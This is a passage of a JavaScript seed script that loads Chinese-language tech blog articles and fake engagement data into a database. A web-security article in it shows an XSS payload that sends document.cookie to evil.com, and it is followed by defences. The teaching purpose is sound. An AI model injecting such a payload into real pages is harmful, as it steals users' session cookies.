# Top K 高频元素
def topKFrequent(nums: List[int], k: int) -> List[int]:
    count = Counter(nums)
    return heapq.nlargest(k, count.keys(), key=count.get)
\`\`\`

### 复习策略

1. 按分类刷，每种题型 5-10 道
2. 每天复习前一天的错题
3. 每周末做一套模拟面试
4. 坚持 8 周，覆盖 Top 100

面试算法没有捷径，**理解 + 反复练习**是唯一的路径。`,
"algorithm", ["python", "tutorial", "cpp"], daysAgo(23));

add("数据结构之美：红黑树与跳表",
`## 数据结构之美：红黑树与跳表

红黑树和跳表是两种经典的**有序数据结构**，在许多系统中都有应用。

### 红黑树

红黑树通过维护以下 5 条性质保证树的高度为 O(log n)：

1. 每个节点是红色或黑色
2. 根节点是黑色
3. 叶节点（NIL）是黑色
4. 红色节点的子节点必须是黑色
5. 从任意节点到其叶节点的路径包含相同数量的黑色节点

\`\`\`cpp
struct RBNode {
    int val;
    bool color; // 0=black, 1=red
    RBNode *left, *right, *parent;
};
\`\`\`

### 跳表

跳表通过**多层索引**达到 O(log n) 的查找效率：

\`\`\`cpp
struct SkipNode {
    int val;
    vector<SkipNode*> forward; // 每层的前向指针
};

// 查找
SkipNode* find(SkipList* sl, int target) {
    SkipNode* cur = sl->head;
    for (int level = sl->maxLevel - 1; level >= 0; level--) {
        while (cur->forward[level] && cur->forward[level]->val < target)
            cur = cur->forward[level];
    }
    return cur->forward[0];
}
\`\`\`

### 对比

| 特性 | 红黑树 | 跳表 |
|------|--------|------|
| 实现难度 | 高 | 中 |
| 内存开销 | 低（1 bit/节点） | 高（多层指针） |
| 并发友好 | 需要锁整棵树 | 可局部加锁 |
| 实际应用 | std::map, Java TreeMap | Redis Sorted Set |

理解数据结构的内部实现让你在系统设计时做出更优的选择。`,
"algorithm", ["cpp", "tutorial"], daysAgo(24));

// ── System Design (3 articles) ──
add("系统设计面试：设计一个短链服务",
`## 系统设计面试：设计一个短链服务

"设计 TinyURL"是系统设计面试的经典题目。本文给出完整的分析框架。

### 需求澄清

**功能需求**：
- 用户输入长 URL，获得短 URL
- 访问短 URL，重定向到原 URL
- 可自定义短链（可选）

**非功能需求**：
- 低延迟：重定向 < 50ms
- 高可用：99.99% 可用性
- URL 永久有效

**规模估算**：
- 日生成 1 亿条短链
- 读写比 10:1
- 存储需求约 50TB（5 年）

### 短链生成算法

| 算法 | 优点 | 缺点 |
|------|------|------|
| Hash + 截断 | 简单 | 冲突需处理 |
| 自增 ID + Base62 | 无冲突 | 可预测 |
| 随机字符串 | 不可预测 | 碰撞概率 |

### 架构设计

\`\`\`
Client → CDN → Load Balancer → API Servers → Cache (Redis)
                                    ↓
                              DB (PostgreSQL)
\`\`\`

- **缓存**：热点 URL 缓存在 Redis
- **数据库**：分库分表，按短链前缀路由
- **CDN**：302 重定向可在边缘节点完成

短链服务的核心在于**高并发读写**和**海量存储**。`,
"system-design", ["tutorial"], daysAgo(25));

add("分布式系统一致性模型",
`## 分布式系统一致性模型

一致性是分布式系统中最核心也最容易被误解的概念。

### CAP 定理

一个分布式系统最多只能同时满足：
- **一致性**（Consistency）
- **可用性**（Availability）
- **分区容错**（Partition Tolerance）

实际系统中 P 是必须的（网络分区不可避免），因此在 C 和 A 之间权衡。

### 一致性模型

| 模型 | 描述 | 示例 |
|------|------|------|
| 强一致性 | 所有节点同一时刻看到相同数据 | Spanner |
| 顺序一致性 | 操作按某种全局顺序执行 | Zookeeper |
| 因果一致性 | 有因果关系的操作有序 | MongoDB |
| 最终一致性 | 最终所有副本会一致 | DNS, CDN |

### 共识算法

**Raft** 是目前最流行的共识算法：

\`\`\`
1. Leader 选举：节点通过投票选出 Leader
2. 日志复制：Leader 将日志复制到 Follower
3. 安全性：日志提交需要多数派确认
\`\`\`

### 实际选择

选择一致性模型时考虑：
1. 业务是否容忍短暂不一致？
2. 延迟要求是什么？
3. 是否需要跨数据中心？

分布式系统的设计永远是**权衡的艺术**。`,
"system-design", ["database", "tutorial"], daysAgo(26));

add("设计模式在 Go 中的应用",
`## 设计模式在 Go 中的应用

Go 语言的设计哲学强调简洁，但设计模式仍然有其用武之地。本文介绍 Go 中最常用的几种模式。

### Option 模式

Go 没有默认参数，Option 模式是最优雅的替代：

\`\`\`go
type ServerOption func(*Server)

func WithTimeout(d time.Duration) ServerOption {
    return func(s *Server) { s.timeout = d }
}

func WithLogger(logger Logger) ServerOption {
    return func(s *Server) { s.logger = logger }
}

func NewServer(addr string, opts ...ServerOption) *Server {
    s := &Server{addr: addr, timeout: defaultTimeout}
    for _, opt := range opts { opt(s) }
    return s
}
\`\`\`

### 泛型在 Go 1.21+ 中的应用

\`\`\`go
// 泛型 Repository 模式
type Repository[T any] interface {
    FindByID(ctx context.Context, id string) (T, error)
    Save(ctx context.Context, entity T) error
    Delete(ctx context.Context, id string) error
}
\`\`\`

学会在 Go 中**适度地**使用设计模式，能让代码更加整洁和可维护。`,
"system-design", ["go", "tutorial"], daysAgo(27));

// ── Tooling (3 articles) ──
add("VS Code 生产力配置 2026",
`## VS Code 生产力配置 2026

一套高效的编辑器配置能成倍提升开发效率。本文分享我的 VS Code 配置。

### 必装扩展

| 扩展 | 用途 |
|------|------|
| GitHub Copilot | AI 代码补全 |
| Prettier | 代码格式化 |
| ESLint | 代码检查 |
| GitLens | Git 增强 |
| Thunder Client | API 测试 |
| Error Lens | 行内错误显示 |

### 键盘快捷键

\`\`\`json
{
  "key": "ctrl+shift+r",
  "command": "editor.action.rename"
},
{
  "key": "ctrl+shift+g",
  "command": "workbench.view.scm"
}
\`\`\`

### settings.json 精选配置

\`\`\`json
{
  "editor.minimap.enabled": false,
  "editor.renderWhitespace": "boundary",
  "editor.cursorBlinking": "phase",
  "editor.fontFamily": "'JetBrains Mono', monospace",
  "editor.fontSize": 14,
  "editor.fontLigatures": true,
  "workbench.colorTheme": "One Dark Pro",
  "terminal.integrated.fontSize": 13
}
\`\`\`

高效的工具配置让你**专注在真正重要的事情上**：写出好代码。`,
"tooling", ["linux", "tutorial"], daysAgo(28));

add("Git 高级技巧：重写历史",
`## Git 高级技巧：重写历史

Git 的历史重写是一把双刃剑，用得好能保持整洁的提交记录。

### Rebase vs Merge

\`\`\`bash
# Merge: 保留真实历史
git merge feature/login

# Rebase: 线性历史
git rebase main
\`\`\`

### 交互式 Rebase

\`\`\`bash
git rebase -i HEAD~5

# pick → 保留提交
# squash → 合并到上一个提交
# reword → 修改提交信息
# drop → 删除提交
\`\`\`

### Git Hooks

\`\`\`bash
# .git/hooks/pre-commit
#!/bin/sh
npm run lint
npm test
\`\`\`

### 常见场景

| 场景 | 命令 |
|------|------|
| 修改最后一次提交 | \`git commit --amend\` |
| 把一个提交拆成两个 | \`git reset HEAD~1\` |
| 找回删除的分支 | \`git reflog\` |
| 撤销已推送的提交 | \`git revert HEAD\` |

**永远不要对已推送的共享分支做 force push**，这是 Git 重写历史的黄金法则。`,
"tooling", ["git", "linux"], daysAgo(29));

add("终端美化与效率工具链",
`## 终端美化与效率工具链

终端是开发者最频繁使用的工具。一套好的终端配置能让你事半功倍。

### Warp 终端

2026 年，Warp 已经成为 macOS 上最好的终端模拟器：
- 原生 AI 命令建议
- 分块输出，可搜索可复制
- 内置 IDE 模式

### Oh My Zsh + Starship

\`\`\`bash
# 安装 Oh My Zsh
sh -c "\$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# 推荐的插件
plugins=(git z zsh-autosuggestions zsh-syntax-highlighting)

# Starship 提示符
eval "\$(starship init zsh)"
\`\`\`

### 效率工具

| 工具 | 替代 | 优势 |
|------|------|------|
| bat | cat | 语法高亮 |
| fd | find | 更快 |
| ripgrep | grep | 更快 |
| zoxide | cd | 智能跳转 |
| fzf | - | 模糊搜索 |

### 终端快捷键

\`\`\`bash
Ctrl+A  → 跳到行首
Ctrl+E  → 跳到行末
Ctrl+W  → 删除前一个单词
Ctrl+R  → 搜索历史命令
!!      → 重复上一条命令
!$      → 上一条命令的最后一个参数
\`\`\`

好的工具配置让你的开发体验从**能用**提升到**好用**。`,
"tooling", ["linux", "tutorial"], daysAgo(30));

// ── Mobile (1 article) ──
add("React Native 跨平台开发实战",
`## React Native 跨平台开发实战

React Native 让你用 React 语法编写原生移动应用。本文分享实战经验。

### 性能优化

\`\`\`typescript
// 使用 FlatList 替代 ScrollView
<FlatList
  data={items}
  renderItem={renderItem}
  keyExtractor={item => item.id}
  windowSize={5}
  removeClippedSubviews={true}
/>
\`\`\`

### 原生模块桥接

\`\`\`java
@ReactMethod
public void vibrate(int duration, Promise promise) {
    try {
        Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(duration);
        promise.resolve(true);
    } catch (Exception e) {
        promise.reject("ERROR", e.getMessage());
    }
}
\`\`\`

RN 适合**快速迭代**和**UI 密集**的应用，但对性能极敏感的场景仍需原生开发。`,
"mobile", ["react", "typescript", "tutorial"], daysAgo(31));

// ── Security (2 articles) ──
add("Web 安全攻防实战",
`## Web 安全攻防实战

了解攻击方式才能更好地防御。本文介绍最常见的 Web 安全漏洞和防御方法。

### XSS（跨站脚本攻击）

**攻击**：注入恶意脚本
\`\`\`html
<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>
\`\`\`

**防御**：
- 输出编码：HTML Entity 转义
- CSP 头：限制脚本来源
- HttpOnly Cookie：防止 JS 读取

### SQL 注入

**防御**：永远使用参数化查询
\`\`\`typescript
// ❌ 危险
db.query(\`SELECT * FROM users WHERE id = \${userId}\`);

// ✅ 安全
db.query("SELECT * FROM users WHERE id = ?", [userId]);
\`\`\`

### CSRF

**攻击**：诱导用户点击恶意链接，利用已登录状态执行操作。

**防御**：SameSite Cookie + CSRF Token + Origin 验证。

### 安全清单

1. 所有输入都要校验和清理
2. 使用 HTTPS
3. 设置安全响应头（CSP, HSTS, X-Frame-Options）
4. 依赖定期更新
5. 日志中不记录敏感信息

安全是**持续的过程**，不是一次性的任务。`,
"security", ["api", "tutorial"], daysAgo(32));

add("HTTPS 和 TLS 1.3 深入理解",
`## HTTPS 和 TLS 1.3 深入理解

HTTPS 是互联网安全的基石。本文从原理上解释 TLS 1.3 的工作机制。

### TLS 握手（1-RTT）

\`\`\`
Client                          Server
  │── ClientHello ──────────────→│
  │   (支持的加密套件)            │
  │                              │
  │←── ServerHello + 证书 ───────│
  │   + 密钥交换参数              │
  │                              │
  │── Finished ─────────────────→│
  │←── Finished ─────────────────│
\`\`\`

TLS 1.3 相比 1.2 的主要改进：
- 握手从 2-RTT 减少到 1-RTT
- 移除不安全的加密算法
- 支持 0-RTT 恢复

### 证书类型

| 类型 | 验证 | 价格 | 适用 |
|------|------|------|------|
| DV | 域名 | 免费 | 个人 |
| OV | 组织 | \$ | 企业 |
| EV | 严格 | \$\$ | 金融 |

### 部署

使用 Let's Encrypt + Certbot 免费获取 DV 证书：
\`\`\`bash
certbot certonly --standalone -d example.com -d www.example.com
\`\`\`

HTTPS 不再是可选项，而是**必须项**。`,
"security", ["linux", "tutorial"], daysAgo(33));

// ── Career (4 articles) ──
add("技术面试通关指南",
`## 技术面试通关指南

面试是技术人职业生涯中不可避免的关卡。本文分享我的面试经验。

### 面试流程

1. **简历筛选**：关键词匹配，项目经验
2. **技术面**：算法、系统设计、项目深挖
3. **交叉面**：跨团队面试官
4. **HR 面**：薪资期望、职业规划

### 算法面试准备

| 阶段 | 时间 | 目标 |
|------|------|------|
| 基础 | 4 周 | 掌握常见数据结构 |
| 刷题 | 4 周 | LeetCode 150 题 |
| 模拟 | 2 周 | 限时编码面试 |

### 系统设计准备

**核心框架**：
1. 需求澄清（功能/非功能）
2. 规模估算（QPS、存储、带宽）
3. API 设计
4. 数据库设计
5. 架构设计（画图）
6. 深入讨论（瓶颈、优化）

### 行为面试

准备 5-8 个 STAR 故事：
- **S**ituation: 情境
- **T**ask: 任务
- **A**ction: 行动
- **R**esult: 结果

面试是一场**展示你最好一面**的对话，不是考试。`,
"career", ["tutorial", "insights"], daysAgo(34));

add("从初级到高级：程序员的成长路径",
`## 从初级到高级：程序员的成长路径

程序员的成长不是线性的，本文梳理从初级到高级的关键跃迁。

### 初级 → 中级（1-3 年）

关键能力：
- 独立完成中等复杂度的功能
- 理解并遵循代码规范
- 能写单元测试
- 参与 Code Review

### 中级 → 高级（3-6 年）

关键跃迁：
- **技术决策能力**：技术选型和架构设计
- **项目管理能力**：任务拆解和进度把控
- **指导能力**：帮助初级同事成长
- **业务理解**：理解技术如何服务业务

### 高级 → 专家（6+ 年）

- 跨团队影响力
- 技术布道和开源贡献
- 行业视野和技术前瞻

成长的关键不是**工作年限**，而是**刻意练习和持续反思**。`,
"career", ["insights", "tutorial"], daysAgo(35));

add("程序员的英语学习方法",
`## 程序员的英语学习方法

对于程序员来说，英语不仅是沟通工具，更是**获取技术信息的关键能力**。

### 阅读

**从易到难**：
1. Stack Overflow 问答（短小、实用）
2. 框架官方文档（结构化、范例丰富）
3. 技术博客（前沿、深度）
4. 学术论文（最难，但最有价值）

### 听力

- **技术播客**：Syntax.fm, Changelog
- **会议演讲**：YouTube 上的技术会议
- **编程教程**：Udemy/Pluralsight 英文课程

### 写作

- 用英文写 Commit Message
- 在 GitHub Issue 中参与讨论
- 写英文技术博客

**每天投入 30 分钟**，一年后你会惊讶于自己的进步。`,
"career", ["insights", "tutorial"], daysAgo(36));

add("远程工作的效率秘诀",
`## 远程工作的效率秘诀

远程工作已经成为程序员的常态，但高效远程工作需要刻意练习。

### 时间管理

**番茄工作法**：
- 25 分钟专注工作
- 5 分钟休息
- 每 4 个番茄钟后休息 15-30 分钟

### 沟通

- **异步优先**：用文字而非会议
- **写清楚上下文**：为什么做、做了什么、还需要什么
- **定期同步**：每日 Standup，每周 1-on-1

### 环境

- 专门的工作空间
- 好的显示器、键盘、椅子
- 降噪耳机

远程工作的核心是**自律**和**有效沟通**。`,
"career", ["insights"], daysAgo(37));

// ── Notes (3 articles) ──
add("2026 年第一季度学习总结",
`## 2026 年第一季度学习总结

回顾 Q1 的学习轨迹，记录成长和不足。

### 完成了什么

- **深入学习了 Next.js 16**：完成了个人博客的重构
- **TypeScript 高级类型**：掌握了条件类型、模板字面量类型
- **算法练习 80 题**：LeetCode Medium 为主
- **阅读了 4 本技术书**：《Designing Data-Intensive Applications》等

### 在做什么

- 学习 Rust 编程语言
- 探索 LLM 应用开发
- 搭建个人知识管理系统

### 下季度目标

1. Rust 完成 The Book + 一个小项目
2. 算法保持每周 5-8 题
3. 写 10 篇技术博客

定期总结让**学习更有方向感**。`,
"notes", ["insights", "tutorial"], daysAgo(38));

add("好书推荐：《Designing Data-Intensive Applications》",
`## 好书推荐：《Designing Data-Intensive Applications》

Martin Kleppmann 的《Designing Data-Intensive Applications》是分布式系统领域的必读书。

### 核心主题

**第一章：可靠性、可扩展性、可维护性**
- 可靠性：即使出现故障也能正确工作
- 可扩展性：能应对负载增长
- 可维护性：便于运维和修改

**第二章：数据模型和查询语言**
对比了关系模型、文档模型和图形模型。

**第三章：存储和检索**
深入讲解了 B-Tree、LSM-Tree 等存储引擎。

### 为什么推荐

这本书不仅告诉你**怎么做**，更解释了**为什么这么做**。读完它，你对数据库和分布式系统的理解会上一个台阶。

推荐给**有 2-3 年经验的开发者**阅读。`,
"notes", ["database", "insights"], daysAgo(39));

add("如何建立个人知识体系",
`## 如何建立个人知识体系

知识管理的核心不是收集，而是**连接和内化**。

### 工具选择

| 工具 | 优点 | 适用 |
|------|------|------|
| Notion | 全能 | 项目管理 |
| Obsidian | 本地化 | 知识网络 |
| Logseq | 开源 | 日记驱动 |

### 我的方法

1. **记录**：遇到有价值的内容，用自己的话写下来
2. **分类**：按主题组织，但不追求完美分类
3. **连接**：在不同笔记间建立双向链接
4. **回顾**：每周回顾，定期清理

### 输出驱动

最好的学习方式是**教给别人**。写博客、做分享、参与讨论都是很好的输出方式。

知识的价值在于**被你使用和应用**。`,
"notes", ["insights"], daysAgo(40));

// ── Projects (3 articles) ──
add("Side Project 开发指南",
`## Side Project 开发指南

Side Project 是程序员成长的重要途径。本文教你如何启动和完成一个 Side Project。

### 选题

好的 Side Project：
1. 解决你自己的**真实问题**
2. 技术栈有**学习价值**
3. 能在 **2-4 周**内完成 MVP

### 技术选型

优先选择你最熟悉的技术栈。效率（做出来）> 炫技（用新东西）。

### 开发流程

\`\`\`
第 1 周：原型 + 核心功能
第 2 周：功能完善 + 测试
第 3 周：部署 + 上线
第 4 周：文档 + 宣传
\`\`\`

### 避免的坑

- ❌ 过度设计（YAGNI）
- ❌ 完美主义（MVP 先上线）
- ❌ 闭门造车（早点给朋友试用）

一个完成的 Side Project 胜过**十个只存在于脑海中的 Idea**。`,
"projects", ["tutorial", "insights"], daysAgo(41));

add("开源项目贡献入门",
`## 开源项目贡献入门

参与开源不仅能提升技术，还能扩大你的技术影响力。

### 找到合适的项目

1. 从你**日常使用的库**开始
2. 搜索 \`good first issue\` 标签
3. 选择活跃维护的项目

### 第一次贡献

\`\`\`bash
git clone https://github.com/owner/repo.git
cd repo
git checkout -b fix/typo-in-readme
# 修改代码
git commit -m "fix: correct typo in README"
git push origin fix/typo-in-readme
# 在 GitHub 上创建 Pull Request
\`\`\`

### PR 礼仪

1. 先读 CONTRIBUTING.md
2. PR 描述写清楚**为什么**
3. 保持小的、聚焦的改动
4. 对反馈保持耐心

开源贡献是**回馈社区**的最好方式，也是**最好的简历**。`,
"projects", ["git", "insights"], daysAgo(42));

add("如何做一个成功的 Hackathon 项目",
`## 如何做一个成功的 Hackathon 项目

Hackathon 是在极限时间内创造产品的比赛，本文分享参赛策略。

### 赛前准备

1. **工具链就绪**：脚手架、UI 模板、部署脚本
2. **团队分工**：前端、后端、设计、演示
3. **熟悉 API**：提前了解要用的第三方 API

### 赛中策略

| 时间段 | 任务 |
|--------|------|
| 0-2h | 确定 idea，设计架构 |
| 2-12h | 核心功能开发 |
| 12-20h | 功能完善，Bug 修复 |
| 20-24h | Demo 准备，演示文稿 |

### Demo 技巧

- **3 分钟讲清楚**：问题 → 方案 → 演示
- 准备好降级方案（Demo 之神不靠谱）
- 强调**创意和技术亮点**

Hackathon 最重要的是**享受创造的过程**和**团队协作的乐趣**。`,
"projects", ["insights"], daysAgo(43));

// ── Insert all articles ──
const insertPost = db.prepare(`
  INSERT INTO user_posts (title, content, description, slug, category, tags, format, author_id, is_published, likes_count, views_count, bookmarks_count, created_at, updated_at)
  VALUES (?, ?, ?, ?, ?, ?, 'markdown', ?, 1, 0, 0, 0, ?, ?)
`);

const insertAll = db.transaction(() => {
  for (const a of articles) {
    insertPost.run(a.title, a.content, a.desc, a.slug, a.category, JSON.stringify(a.tags), weipeiluo.id, a.date, a.date);
  }
});
insertAll();
console.log(`Seeded ${articles.length} articles`);

// ── Interaction generation: dates spread between post creation and now ──
// Map: slug → created_at for date range calculation
const slugDates = new Map(articles.map(a => [a.slug, new Date(a.date).getTime()]));
const allSlugs = articles.map(a => a.slug);
const nowMs = Date.now();

// Helper: random timestamp between post date and now
function randomDateBetween(slug) {
  const postMs = slugDates.get(slug) || nowMs;
  const gap = Math.max(3600000, nowMs - postMs); // at least 1 hour
  return new Date(postMs + Math.random() * gap).toISOString();
}

// ── Likes ──
const insertLike = db.prepare("INSERT OR IGNORE INTO likes (post_slug, user_id, created_at) VALUES (?, ?, ?)");
const likeData = [];
for (const user of [...otherUsers, weipeiluo]) {
  const count = 8 + Math.floor(Math.random() * 13); // 8-20 likes per user
  const shuffled = [...allSlugs].sort(() => Math.random() - 0.5);
  for (const slug of shuffled.slice(0, count)) {
    likeData.push({ slug, userId: user.id, date: randomDateBetween(slug) });
  }
}
const insertLikes = db.transaction(() => {
  for (const l of likeData) insertLike.run(l.slug, l.userId, l.date);
});
insertLikes();
const likeCounts = db.prepare("SELECT post_slug, COUNT(*) as cnt FROM likes GROUP BY post_slug").all();
const updateLikes = db.prepare("UPDATE user_posts SET likes_count = ? WHERE slug = ?");
for (const lc of likeCounts) updateLikes.run(lc.cnt, lc.post_slug);
console.log(`Seeded ${likeData.length} likes`);

// ── Bookmarks ──
const insertBm = db.prepare("INSERT OR IGNORE INTO bookmarks (post_slug, user_id, created_at) VALUES (?, ?, ?)");
const bmData = [];
for (const user of otherUsers) {
  const count = 3 + Math.floor(Math.random() * 8);
  const shuffled = [...allSlugs].sort(() => Math.random() - 0.5);
  for (const slug of shuffled.slice(0, count)) {
    bmData.push({ slug, userId: user.id, date: randomDateBetween(slug) });
  }
}
const insertBms = db.transaction(() => {
  for (const b of bmData) insertBm.run(b.slug, b.userId, b.date);
});
insertBms();
const bmCounts = db.prepare("SELECT post_slug, COUNT(*) as cnt FROM bookmarks GROUP BY post_slug").all();
const updateBms = db.prepare("UPDATE user_posts SET bookmarks_count = ? WHERE slug = ?");
for (const bc of bmCounts) updateBms.run(bc.cnt, bc.post_slug);
console.log(`Seeded ${bmData.length} bookmarks`);

// ── Comments ──
const insertComment = db.prepare("INSERT INTO comments (post_slug, author_id, author_name, content, parent_id, created_at) VALUES (?, ?, ?, ?, NULL, ?)");
const commentTemplates = [
  "写得太好了！收获很大，收藏了慢慢看。",
  "感谢分享，正好在学这个方向。",
  "请问有推荐的进阶资料吗？",
  "实践出真知，建议大家可以跟着代码敲一遍。",
  "楼主写得非常详细，解决了我的困惑！",
  "期待下一篇更新！",
  "这个系列太棒了，已推荐给同事。",
  "Mark 一下，回头好好学习。",
  "有几个地方不太理解，能展开讲讲吗？",
  "总结得很全面，点赞！",
  "刚入门的小白表示很有帮助 🙏",
  "代码示例很清楚，直接能跑通。",
  "收藏了，作为参考资料很不错。",
  "文章质量很高，希望能继续更新。",
  "同感，我之前也遇到过类似的问题。",
  "写得很好",
  "每天刷一篇，进步看得见。",
  "技术博客就应该这样写，简单明了。",
  "看完了，受益匪浅！",
];
const commentData = [];
for (const user of [...otherUsers, weipeiluo]) {
  const count = 5 + Math.floor(Math.random() * 11);
  const shuffled = [...allSlugs].sort(() => Math.random() - 0.5);
  for (const slug of shuffled.slice(0, count)) {
    const content = commentTemplates[Math.floor(Math.random() * commentTemplates.length)];
    commentData.push({ slug, userId: user.id, username: user.username, content, date: randomDateBetween(slug) });
  }
}
const insertComments = db.transaction(() => {
  for (const c of commentData) insertComment.run(c.slug, c.userId, c.username, c.content, c.date);
});
insertComments();
console.log(`Seeded ${commentData.length} comments`);

// ── Views ──
const insertView = db.prepare("INSERT INTO views (post_slug, visitor_id, created_at) VALUES (?, ?, ?)");
const viewData = [];
const visitors = ["user1-visitor", "user2-visitor", "user3-visitor", "anonymous", "google-bot"];
for (const slug of allSlugs) {
  const count = 10 + Math.floor(Math.random() * 80);
  for (let i = 0; i < count; i++) {
    viewData.push({ slug, vid: visitors[Math.floor(Math.random() * visitors.length)], date: randomDateBetween(slug) });
  }
}
const insertViews = db.transaction(() => {
  for (const v of viewData) insertView.run(v.slug, v.vid, v.date);
});
insertViews();
const viewCounts = db.prepare("SELECT post_slug, COUNT(*) as cnt FROM views GROUP BY post_slug").all();
const updateViews = db.prepare("UPDATE user_posts SET views_count = ? WHERE slug = ?");
for (const vc of viewCounts) updateViews.run(vc.cnt, vc.post_slug);
console.log(`Seeded ${viewData.length} views`);

console.log("\n✅ Seed complete! Restart the app to see changes.");
db.close();
